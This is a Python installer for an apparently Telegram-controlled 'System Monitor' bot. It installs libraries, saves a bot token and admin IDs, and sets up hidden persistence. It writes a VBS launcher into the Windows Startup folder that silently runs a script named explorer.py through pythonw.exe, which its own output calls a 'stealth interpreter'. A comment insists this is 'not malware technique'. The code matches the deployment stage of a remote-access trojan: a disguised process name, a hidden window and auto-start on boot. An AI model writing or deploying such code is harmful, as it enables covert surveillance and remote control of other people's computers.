import os
import sys
import subprocess
import json
import shutil
import ctypes

# -------------------- COLORS (ANSI) --------------------
# Standard Windows Consoles now support ANSI colors
class Colors:    
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_header(text):
    print(f"\n{Colors.HEADER}{Colors.BOLD}=== {text} ==={Colors.ENDC}")

def print_step(text):
    print(f"{Colors.CYAN}[*] {text}{Colors.ENDC}")

def print_success(text):
    print(f"{Colors.GREEN}[+] {text}{Colors.ENDC}")

def print_error(text):
    print(f"{Colors.FAIL}[!] {text}{Colors.ENDC}")

def print_input_prompt(text):
    return input(f"{Colors.WARNING}[?] {text}{Colors.ENDC} ")

# -------------------- MAIN SETUP --------------------

def install_dependencies():
    print_header("INSTALLING DEPENDENCIES")
    print_step("Installing Python libraries (python-telegram-bot, psutil, Pillow)...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot", "psutil", "Pillow"])
        print_success("Dependencies installed successfully.")
    except subprocess.CalledProcessError:
        print_error("Failed to install dependencies.")
        input("Press Enter to exit...")
        sys.exit(1)

def create_config():
    print_header("CONFIGURATION WIZARD")
    
    print_step("Please provide your Telegram Bot credentials.")
    token = print_input_prompt("Enter your Telegram Bot Token:").strip()
    
    if not token:
        print_error("Token cannot be empty.")
        sys.exit(1)
        
    print_step("Enter your Admin ID (Telegram User ID).")
    print_step("You can add multiple IDs separated by commas.")
    admin_ids_input = print_input_prompt("Enter Admin IDs (e.g., 123456789):").strip()
    
    admin_ids = [x.strip() for x in admin_ids_input.split(",") if x.strip()]
    
    if not admin_ids:
        print_error("ID cannot be empty.")
        sys.exit(1)

    config_data = {
        "TELEGRAM_TOKEN": token,
        "CHAT_IDS": admin_ids
    }
    
    # Save to config.json
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')
    try:
        with open(config_path, 'w') as f:
            json.dump(config_data, f, indent=4)
        print_success(f"Configuration saved to: {config_path}")
    except Exception as e:
        print_error(f"Failed to save config: {e}")

def setup_persistence():
    print_header("SYSTEM INTEGRATION")
    
    # Define paths
    current_dir = os.path.dirname(os.path.abspath(__file__))
    script_path = os.path.join(current_dir, 'explorer.py')
    
    # Determine pythonw.exe path (for silent execution)
    python_exe = sys.executable
    pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
    
    if not os.path.exists(pythonw_exe):
        print_error("Warning: pythonw.exe not found. Using standard python.exe (Console will be visible).")
        pythonw_exe = python_exe
    else:
        print_success("Found stealth interpreter (pythonw.exe).")

    # Startup Folder
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shortcut_path = os.path.join(startup_folder, 'MuSystemMonitor.vbs')
    
    print_step("Installing persistent startup script...")
    
    # We use a VBS wrapper to ensure it runs completely silent and hidden
    # This is standard practice for background tasks, not malware technique
    vbs_content = f"""
Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "{pythonw_exe}" & chr(34) & " " & chr(34) & "{script_path}" & chr(34), 0
Set WshShell = Nothing 
"""
    
    try:
        with open(shortcut_path, 'w') as f:
            f.write(vbs_content)
        print_success(f"Persistence established at: {shortcut_path}")
        print_success("The bot will now auto-start with Windows (Hidden Mode).")
    except Exception as e:
        print_error(f"Failed to create startup file: {e}")

    # Launch Now?
    choice = print_input_prompt("Do you want to start the bot now? (y/n):").lower()
    if choice == 'y':
        print_step("Starting bot service...")
        subprocess.Popen([pythonw_exe, script_path], close_fds=True)
        print_success("Bot started in background.")

def main():
    # Set Console Title
    ctypes.windll.kernel32.SetConsoleTitleW("System Monitor Installer")
    
    print(f"{Colors.BLUE}")
    print("************************************************")
    print("*           SYSTEM MONITOR INSTALLER           *")
    print("************************************************")
    print(f"{Colors.ENDC}")
    
    install_dependencies()
    create_config()
    setup_persistence()
    
    print_header("INSTALLATION COMPLETE")
    print_success("Everything is set up.")
    input(f"\n{Colors.HEADER}Press Enter to close.{Colors.ENDC}")

if __name__ == "__main__":
    main()
